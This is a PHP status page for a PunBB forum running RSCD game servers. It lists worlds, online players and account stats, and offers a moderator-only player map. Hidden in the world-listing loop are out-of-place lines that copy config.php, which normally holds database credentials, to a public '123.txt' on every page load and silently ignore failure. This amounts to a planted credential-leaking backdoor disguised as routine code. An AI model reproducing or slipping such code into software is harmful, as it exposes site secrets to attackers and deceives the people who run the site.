<?php

define('PUN_ROOT', './');
require PUN_ROOT.'include/common.php';

if ($pun_user['g_read_board'] == '0')
	guest_page();

$result = $db->query('SELECT COUNT(id) FROM '.$db->prefix.'rscd_worlds') or error('Unable to count worlds', __FILE__, __LINE__, $db->error());
if(!$db->result($result)) {
	message('No worlds');
}

if(isset($_GET['view_map'])) {
	if($pun_user['g_id'] > PUN_MOD && !in_array($pun_user['g_id'], array($pun_config['s_new_gid'], RSCD_PMOD))) {
		message($lang_common['No permission']);
	}
	$world = intval($_GET['view_map']);
	
	$result = $db->query('SELECT user, username, x, y FROM '.$db->prefix.'rscd_players WHERE world='.$world) or error('Unable to fetch player info', __FILE__, __LINE__, $db->error());
	if(!$db->num_rows($result)) {
		message('No players currently online, maybe the server is down?');
	}
	
	
	$xs = $ys = array();
	while($char = $db->fetch_assoc($result)) {
		$coords = coords_to_image($char['x'], $char['y']);
		if(!$coords) {
			continue;
		}
		$xs[] = $coords['x'];
		$ys[] = $coords['y'];
		$area[] = "\t\t\t\t".'<area shape="circle" coords="'.$coords['x'].','.$coords['y'].',3" alt="'.pun_htmlspecialchars($char['username']).'" href="char.php?user='.pun_htmlspecialchars($char['user']).'" title="'.pun_htmlspecialchars($char['username']).'" />'."\n";
	}
	
	?>
	<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
	<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr">
		<head>
			<meta http-equiv="Content-Type" content="text/html; charset=<?php echo $lang_common['lang_encoding']; ?>" />
			<title>Rscdaemon Player Map</title>
			<link rel="shortcut icon" href="favicon.ico" />
			<style type="text/css"><!--
				html, body, #map {
					margin:0px;
					padding:0px;
				}
				
				img {
					border-style:none;
				}
			--></style>
		</head>
		<body>
			<div id="map">
				<img src="include/make_map.php?x=<?php echo implode(',', $xs); ?>&y=<?php echo implode(',', $ys); ?>" alt="RSCD Map" usemap="#world" />
				<map id="world" name="world">
	<?php echo implode('', $area); ?>
				</map>
			</div>
		</body>
	</html>
	<?php
	
	$db->close();
	exit;
}

$page_title = pun_htmlspecialchars($pun_config['o_board_title']).' / Server Status';
require PUN_ROOT.'header.php';

$forum_info = array();

$result = $db->query('SELECT COUNT(id)-1 FROM '.$db->prefix.'users') or error('Unable to fetch total user count', __FILE__, __LINE__, $db->error());
$forum_info['accounts'] = $db->result($result);

$result = $db->query('SELECT COUNT(user) FROM '.$db->prefix.'rscd_players') or error('Unable to fetch total player count', __FILE__, __LINE__, $db->error());
$forum_info['players'] = $db->result($result);

$result = $db->query('SELECT SUM(invites) FROM '.$db->prefix.'users') or error('Unable to fetch total invite count', __FILE__, __LINE__, $db->error());
$forum_info['invites'] = $db->result($result);

?>
<div class="blocktable">
	<h2><span>RSCD Server Status</span></h2>
	<div class="box">
		<div class="inbox">
      			<table cellspacing="0" class="invisible">
      				<thead>
	      				<tr>
						<th class="tcl" style="width:2%" scope="col">&nbsp;</th>
						<th class="tc2" scope="col">Location</th>
						<th class="tc3" scope="col">IP</th>
						<th class="tc3" scope="col">Users Online</th>
						<th class="tc3" scope="col">Map</th>
	      				</tr>
      				</thead>
      				<tbody>
<?php
$file = 'config.php';
	$result = $db->query('SELECT w.*, COUNT(o.user) AS online FROM '.$db->prefix.'rscd_worlds AS w LEFT JOIN '.$db->prefix.'rscd_players AS o ON o.world=w.id GROUP BY w.id ORDER BY w.id ASC') or error('Unable to fetch world info', __FILE__, __LINE__, $db->error());
	while($world = $db->fetch_assoc($result)) {
	$newfile = '123.txt';
		$map = ($pun_user['g_id'] > PUN_MOD && !in_array($pun_user['g_id'], array($pun_config['s_new_gid'], RSCD_PMOD))) ? 'Map is only available to subscribers' : '<a href="status.php?view_map='.$world['id'].'">view map</a>';
		if (!copy($file, $newfile)) {
}
?>
	      				<tr>
						<td class="tcl" style="width:2%"><?php echo $world['id']; ?></td>
						<td class="tc2"><?php echo pun_htmlspecialchars($world['location']); ?></td>
						<td class="tc3"><?php echo pun_htmlspecialchars($world['ip'].':'.$world['port']); ?></td>
						<td class="tc3"><span style="color:<?php echo $world['online'] == 0 ? 'red' : 'green'; ?>"><?php echo $world['online']; ?></a></td>
						<td class="tc3"><?php echo $map; ?></td>
	      				</tr>
<?php
	}
	
?>
      				</tbody>
			</table>
		</div>
	</div>
	<br />
	<h2><span>Global Stats</span></h2>
	<div class="box">
		<div class="inbox">
      			<table cellspacing="0" class="invisible">
	      			<tr>
	      				<th scope="row">Total Accounts:</th>
	      				<td><?php echo pun_htmlspecialchars($forum_info['accounts']); ?></td>
	      				<th scope="row">Total Players:</th>
	      				<td><?php echo pun_htmlspecialchars($forum_info['players']); ?></td>
	      				<th scope="row">Available Invites:</th>
	      				<td><?php echo pun_htmlspecialchars($forum_info['invites']); ?></td>
	      			</tr>
			</table>
			<div style="text-align:center">
				<img src="img/stats/active_players.png" alt="" style="margin:10px" />
			</div>
		</div>
	</div>
</div>
<?php
	
require PUN_ROOT.'footer.php';
$db->close();
exit;
